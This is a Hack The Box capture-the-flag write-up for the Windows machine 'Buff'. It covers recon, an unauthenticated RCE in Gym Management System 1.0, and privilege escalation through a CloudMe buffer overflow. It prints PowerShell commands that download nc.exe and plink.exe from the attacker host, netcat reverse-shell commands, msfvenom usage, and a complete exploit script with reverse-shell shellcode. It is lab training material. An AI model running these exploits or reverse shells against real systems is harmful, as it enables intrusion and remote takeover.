---
title: HTB - Buff Write-up
author: bigb0ss
date: 2020-11-20 23:25:00 +0800
categories: [Hack The Box, Windows, Easy]
tags: [hackthebox, buff, gymManagementSystem 1.0 RCE, plink, cloudMe bof]
image: /assets/img/post/htb/buff/01_infocard.png
---

# Initial Recon

## Nmap

Let’s begin with an initial port scan:

```console
$ nmap -Pn --open -p- -sC -sV 10.10.10.198

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
```

### Interesting Ports to Note

* HTTP (8080/TCP) - Web page. Gym Management Software 1.0

The contact page disclosing the version of the application:

![image](/assets/img/post/htb/buff/02.png)


# Initial Foothold

That particular version of the software was vulnerable to an Unauthenticated Remote Code Execution discovered by Bobby Cooke. The POC exploitation script can be found [here](https://www.exploit-db.com/exploits/48506).

## Gym Management System 1.0 - Unauthenticated Remote Code Execution

By running the POC script, I successfully obtained an interactive web shell on the Buff box.

![image](/assets/img/post/htb/buff/03.png)

## Netcat Reverse Shell

Using the PowerShell, I uploaded the `nc.exe` onto the Buff box.

```console
C:\> powershell Invoke-WebRequest -Uri http://10.10.14.15/nc.exe -OutFile C:\xampp\htdocs\gym\upload\nc.exe
```

![image](/assets/img/post/htb/buff/04.png)

```console
C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.15 443 -e cmd.exe
```

![image](/assets/img/post/htb/buff/05.png)

As the user `shaun` , I could read the `user.txt` file.

![image](/assets/img/post/htb/buff/06.png)


# Privilege Escalation

## Shaun —> Administrator

Within the `shaun` user’s Download directory, there was a binary called `CloudMe_1112.exe` and this binary was actually running on the system as well. 

![image](/assets/img/post/htb/buff/07.png)

With some Google search, I found a BOF exploit for this CloudMe version 1.11.2 [here](https://www.exploit-db.com/exploits/48389). From the POC script, the port for the CloudMe product was `8888` and that port was indeed in use on the Buff box; however, it was only accessible locally. 

> **NOTE**: I did not dig in further, but the PID for the CloudMe.exe kept changing. I suspected it was happening because of some type of scheduled tasks.

### Port Forwarding (plink.exe)

```console
C:\> powershell Invoke-WebRequest -Uri http://10.10.14.15/plink.exe -OutFile c:\Users\shaun\Downloads\plink.exe
```

![image](/assets/img/post/htb/buff/08.png)

The outbound to port 22 from the Buff box was restricted. So, I had to modified the following SSH config on my Kali:

![image](/assets/img/post/htb/buff/09.png)

Starting an SSH service on my Kali Linux:

![image](/assets/img/post/htb/buff/10.png)

```console
C:\> c:\users\shaun\downloads\plink.exe -ssh -P 8001 root@10.10.14.15 -R 8002:127.0.0.1:8888 -N
```

![image](/assets/img/post/htb/buff/11.png)

![image](/assets/img/post/htb/buff/12.png)

### BOF Exploit

First, created the `msfvenom` payload for the reverse shell.

```console
msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.15 8003 -e cmd.exe' -b '\x00\x0A\x0D' -f python
```

```python
import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.15 8003 -e cmd.exe' -b '\x00\x0A\x0D' -f python
buf =  b""
buf += b"\xbf\xa8\x82\xfa\xea\xdd\xc1\xd9\x74\x24\xf4\x5d\x29"
buf += b"\xc9\xb1\x3e\x83\xed\xfc\x31\x7d\x10\x03\x7d\x10\x4a"
buf += b"\x77\x06\x02\x08\x78\xf7\xd3\x6c\xf0\x12\xe2\xac\x66"
buf += b"\x56\x55\x1c\xec\x3a\x5a\xd7\xa0\xae\xe9\x95\x6c\xc0"
buf += b"\x5a\x13\x4b\xef\x5b\x0f\xaf\x6e\xd8\x4d\xfc\x50\xe1"
buf += b"\x9e\xf1\x91\x26\xc2\xf8\xc0\xff\x89\xaf\xf4\x74\xc7"
buf += b"\x73\x7e\xc6\xc6\xf3\x63\x9f\xe9\xd2\x35\xab\xb0\xf4"
buf += b"\xb4\x78\xc9\xbc\xae\x9d\xf7\x77\x44\x55\x8c\x89\x8c"
buf += b"\xa7\x6d\x25\xf1\x07\x9c\x37\x35\xaf\x7e\x42\x4f\xd3"
buf += b"\x03\x55\x94\xa9\xdf\xd0\x0f\x09\x94\x43\xf4\xab\x79"
buf += b"\x15\x7f\xa7\x36\x51\x27\xa4\xc9\xb6\x53\xd0\x42\x39"
buf += b"\xb4\x50\x10\x1e\x10\x38\xc3\x3f\x01\xe4\xa2\x40\x51"
buf += b"\x47\x1b\xe5\x19\x6a\x48\x94\x43\xe1\x8f\x2a\xfe\x47"
buf += b"\x8f\x34\x01\xf8\xe7\x05\x8a\x97\x70\x9a\x59\xdc\x8e"
buf += b"\xd0\xc0\x75\x06\xbd\x90\xc7\x4b\x3e\x4f\x0b\x75\xbd"
buf += b"\x7a\xf4\x82\xdd\x0e\xf1\xcf\x59\xe2\x8b\x40\x0c\x04"
buf += b"\x3f\x61\x05\x47\x85\xc1\xde\x29\x94\x89\x6e\xf6\x0e"
buf += b"\x1d\xeb\x69\xac\xae\xaf\x12\x4b\x3d\x0c\xa8\xdb\xd1"
buf += b"\xc3\x33\x78\x75\x72\xd7\xae\xe0\xf2\x72\x8f\xdb\x32"
buf += b"\x53\xfe\x2b\x1d\x9a\x34\x65\x50\xe9\x14\x41\xa2\x21"
buf += b"\x66\x91\xef\x24\xa8\xb2\x82\xc2\x86\x51\x25\x6e\xd7"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + buf))

buf = padding1 + EIP + NOPS + buf + overrun 

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8002))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```

I received the elevated shell on the Netcat listener and read the `root.txt` flag.

![image](/assets/img/post/htb/buff/13.png)


































